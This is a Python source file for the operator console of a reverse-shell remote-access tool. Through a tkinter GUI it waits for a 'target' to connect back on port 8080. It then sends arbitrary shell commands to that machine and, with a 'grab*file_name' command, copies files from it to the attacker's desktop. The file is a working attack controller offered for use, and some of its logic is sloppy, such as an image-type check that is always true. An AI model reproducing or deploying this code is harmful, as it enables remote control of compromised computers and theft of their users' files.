import tkinter
from tkinter import *
import socket
import threading

import os
from PIL import Image
global x
x = ""
global conn
conn = {}
global z
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("127.0.0.1", 80))
z = s.getsockname()[0]
s.close()
global n
n = ""
global b
b=""
global data
data = ""
global d
d = ""

def Input(x):


    global conn
    global data
    global b
    print(ment.get())

    command = ment.get()

    if '*' in command:
        a, b = command.split('*')



    if 'terminate' in command:
        conn['host1'].sendall(b'terminate')
        conn['host1'].close()
    elif 'grab' in command:
        conn['host1'].sendall(command.encode())
        f = open('/root/Desktop/test.png', 'wb')
        while True:
            bits = conn['host1'].recv(1024)

            if b'Unable to find the file' in bits:
                print('Unable to find the file')
                break

            if bits.endswith(b'Done'):
                print("[+] Transfer Complete")
                f.close()
                break
            f.write(bits)

    else:
        conn['host1'].sendall(command.encode())
        data = conn['host1'].recv(1024)
        data.decode()
        print (data)


def result():
    global b
    global d
    print(b)
    os.chdir("/root/Desktop/")
    os.rename('test.png', b)
    f = open(b, mode="r")
    s = f.read()
    sw1 = tkinter.Tk()
    sw1.geometry('1080x720')
    outputBox = Text(sw1, width=100, height=50, background="white")
    outputBox.grid(row=15, column=15)

    outputBox.insert(END, s)
    if "." in b:
        c, d = b.split(".")
        print(d)

        if d == "png" or "jpg":

            img = Image.open(b)
            img.show()

def info():
    sw1 = tkinter.Tk()
    sw1.geometry('1080x720')
    outputBox = Text(sw1, width=100, height=50, background="white")
    outputBox.grid(row=15, column=15)

    outputBox.insert(END, data)

def T1():
    global x
    global z
    global ment
    global data
    mw = tkinter.Tk()
    mw.geometry('720x720')

    print(z)
    ment = StringVar()


    # f = Frame(mw, height=100, width=200)
    # f.grid(row=0, column=0, sticky="NW", padx=500)
    l = Label(mw, text="Information Gathering")
    l.grid(row=0, column=100, columnspan=4, padx=100)

    frame = Frame(mw, height=100, width=100)
    frame.pack_propagate(0)  # dont shrink
    frame.grid(row=100, column=100)

    l1 = Label(frame, text="Enter Command =>")
    l1.grid(row=5, column=10)
    e1 = Entry(frame, textvariable=ment)
    e1.grid(row=5, column=11)
    # b4 = Button(frame, text='Result', command=result)
    # b4.grid(row=5, column=20)

    b1 = Button(frame, text='Send', command=lambda :Input(x))
    b1.grid(row=6, column=10)
    b2 = Button(frame, text='Quit', command=mw.destroy)
    b2.grid(row=6, column=20)
    b3 = Button(frame, text='Results',command=result)
    b3.grid(row=5, column=20)
    b4 = Button(frame, text='information', command=info)
    b4.grid(row=5, column=22)
    ##
    l2 = Label(frame, text="1).Let the target connect to us. ")
    l2.grid(row=10, column=10)
    l3 = Label(frame, text="2).Enter the command")
    l3.grid(row=12, column=10)
    l5 = Label(frame, text="3).Click Send")
    l5.grid(row=14, column=10)
    l6 = Label(frame, text="4).Click Result")
    l6.grid(row=16, column=10)
    l6 = Label(frame, text="4).To grab the file type -- grab*file_name.")
    l6.grid(row=18, column=10)

    mw.mainloop()

def T2():
    global z
    global data
    global conn
    conn = {}
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((z, 8080))
    s.listen(1)
    conn['host1'], addr = s.accept()


t1 = threading.Thread(target=T1)
t2 = threading.Thread(target=T2)
t1.start()
t2.start()

t1.join()
t2.join()